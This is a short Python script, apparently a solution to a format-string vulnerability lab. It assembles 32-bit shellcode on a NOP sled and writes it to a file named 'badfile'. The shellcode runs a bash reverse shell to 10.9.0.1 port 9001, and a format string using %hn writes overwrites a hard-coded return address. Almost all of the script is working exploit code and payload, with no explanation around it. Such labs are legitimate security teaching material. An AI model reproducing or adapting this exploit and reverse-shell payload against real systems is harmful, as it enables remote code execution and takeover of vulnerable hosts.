#!/usr/bin/python3
from cgitb import small
from distutils.command.build import build

# 32-bit Generic Shellcode 
shellcode_32 = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/bash -i >& /dev/tcp/10.9.0.1/9001 0>&1;"
   #"/bin/ls -l; echo '===== Success! ======'                 *"
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

N = 1500
# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

# Choose the shellcode version based on your target
shellcode = shellcode_32
# Put the shellcode somewhere in the payload
start = N - len(shellcode)               # Change this number
content[start:start + len(shellcode)] = shellcode

# Format String Construction Below

add1 = 0xffffd4d8+4 # Frame pointer + 4 = Return Address
#print(hex(add1),hex(add1+2))
content[0:4] = (add1+2).to_bytes(4,byteorder='little')
content[4:8] = ("@@@@") .encode('latin-1')
content[8:12] = (add1).to_bytes(4,byteorder='little')

buff_start = 0xffffd5b0 + 1200
start = 0xffff - 12 - (8*62)
end = 0x1db00 - 0xffff
s = "%.8x"*62 + "%." + str(start) + "x" + "%hn" + "%." + str(end) + "x" + "%hn"
format_string = (s).encode('latin-1')
content[12:12+len(format_string)] = format_string

# Save the format string to file
with open('badfile', 'wb') as f:
  f.write(content)
